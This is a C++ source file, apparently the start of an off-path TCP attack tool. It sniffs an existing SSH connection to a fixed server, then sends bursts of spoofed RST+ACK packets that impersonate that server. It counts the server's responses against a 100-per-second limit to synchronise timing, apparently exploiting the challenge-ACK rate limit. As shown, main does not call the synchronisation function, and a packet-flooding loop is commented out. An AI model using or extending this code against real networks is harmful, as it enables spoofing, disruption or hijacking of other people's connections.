#include "packet_counter.h"

#include <chrono>
#include <iostream>
#include <tins/tins.h>
#include <sstream>

#include "common.h"

using namespace std;
using namespace std::chrono;
using namespace std::chrono_literals;

const string kNetworkInterface("enx5cf7e68b298b");
const string kServerIP("192.168.1.100");
const uint32_t kServerPort = 22;

// Inital number of legit SSH packets to trigger sniffer
const int kInitPacketCount = 10;
const uint32_t kInitPacketWaitSec = 2;

void printHeader(const std::string msg) {
    for (auto i = 0u; i < msg.size() + 4; i++) {
        cout << "=";
    }
    cout << endl << msg << endl;
    for (auto i = 0u; i < msg.size() + 4; i++) {
        cout << "=";
    }
    cout << endl;
}

pair<ConnectionID, uint32_t> waitAndGetLegitConnectionInfo(
  const string& serverIP, int serverPort) {
    Tins::Sniffer sniffer(kNetworkInterface);
    sniffer.set_filter(
      "dst host " + serverIP + " and dst port " + to_string(serverPort));
    sniffer.set_pcap_sniffing_method(pcap_dispatch);
    sniffer.set_timeout(kInitPacketWaitSec);
    int packetCount = kInitPacketCount;
    while (packetCount > 0) {
        sniffer.next_packet();
        packetCount--;
    }

    cout << "Got " << kInitPacketCount 
         << " initial packets. Sniffing for more until silent for "
         << kInitPacketWaitSec << " sec" << endl;

    uint32_t lastSeq = 0;
    ConnectionID connection;
    while (has_packet(sniffer, kInitPacketWaitSec)) {
        auto pdu = sniffer.next_packet().pdu();
        const Tins::IP &ip = pdu->rfind_pdu<Tins::IP>();
        const Tins::TCP &tcp = pdu->rfind_pdu<Tins::TCP>();
        connection = ConnectionID(ip.src_addr(), tcp.sport(), ip.dst_addr(), tcp.dport()); 
        lastSeq = max(lastSeq, tcp.seq());
    }
    return make_pair(connection, lastSeq);
}

int synchronizeClock(ConnectionID legitConn, int legitLastSeq) {
    Tins::PacketSender sender;
    Tins::IP ipHeader = Tins::IP(legitConn.serverIP, legitConn.clientIP);
    Tins::TCP tcpHeader = Tins::TCP(legitConn.serverPort, legitConn.clientPort);
    tcpHeader.set_flag(Tins::TCP::Flags::RST, 1);
    tcpHeader.set_flag(Tins::TCP::Flags::ACK, 1);
    tcpHeader.seq(legitLastSeq + 3);
    Tins::IP pkt = ipHeader / tcpHeader / Tins::RawPDU("C");
    
    PacketCounter pcounter(kNetworkInterface, 
      "src host " + kServerIP + " and src port " + to_string(kServerPort));
    
    uint32_t n1, n2;
    {
        cout << "Sending out 200 packets in 1 sec..." << endl;
        pcounter.startCounting();
        auto now = system_clock::now();
        auto s = duration_cast<seconds>(now.time_since_epoch()) + 1000ms;
        this_thread::sleep_until(system_clock::time_point(s));
        for (int i = 0; i < 200; i++) {
            sender.send(pkt);
            s += 5ms;
            this_thread::sleep_until(system_clock::time_point(s));
        }
        this_thread::sleep_for(2s);
        n1 = pcounter.stopCounting();
        cout << "n1 = " << n1 << endl;
    }

    {
        cout << "Sending out 200 packets in 1 sec and 5ms delay..." << endl;
        pcounter.startCounting();
        auto now = system_clock::now();
        auto s = duration_cast<seconds>(now.time_since_epoch()) + 1005ms;
        this_thread::sleep_until(system_clock::time_point(s));
        for (int i = 0; i < 200; i++) {
            sender.send(pkt);
            s += 5ms;
            this_thread::sleep_until(system_clock::time_point(s));
        }
        this_thread::sleep_for(2s);
        n2 = pcounter.stopCounting();
        cout << "n2 = " << n2 << endl;
    }

    uint32_t delay_ms = 0;
    if (n1 == 100) {
        delay_ms = 0;
    } else if (n2 == 100) {
        delay_ms = 5;
    } else if (n1 > n2) {
        delay_ms = 5 + (n2 - 100) * 1000 / 200;
    } else {
        delay_ms = 5 + (300 - n2) * 1000 / 200;
    }
    return delay_ms;
}

int main() {
    printHeader("WAITING FOR THE LEGIT CONNECTION...");

    auto legitInfo = waitAndGetLegitConnectionInfo(kServerIP, kServerPort);
    auto legitConn = legitInfo.first;
    auto legitLastSeq = legitInfo.second;
    cout << "Got legit connection info: " << legitConn.toString() << " " << legitLastSeq << endl;

    printHeader("SYNCHRONIZING CLOCK...");

    // for (int c = 0; c < 5; c++) {
    //     pcounter.startCounting();
    //     auto now = system_clock::now();
    //     auto s = duration_cast<seconds>(now.time_since_epoch()) + 1000ms + milliseconds(delay_ms);
    //     this_thread::sleep_until(system_clock::time_point(s));
    //     int packets = 33000;
    //     for (int i = 0; i < packets; i++) {
    //         sender.send(pkt);
    //     }
    //     this_thread::sleep_for(3s);

    //     auto result = pcounter.stopCounting();
    //     cout << "Delay until: " << s.count() << "ms. ";
    //     cout << " Sent: " << packets << " packets. Received: " << result << " packets" << endl;
    // }
}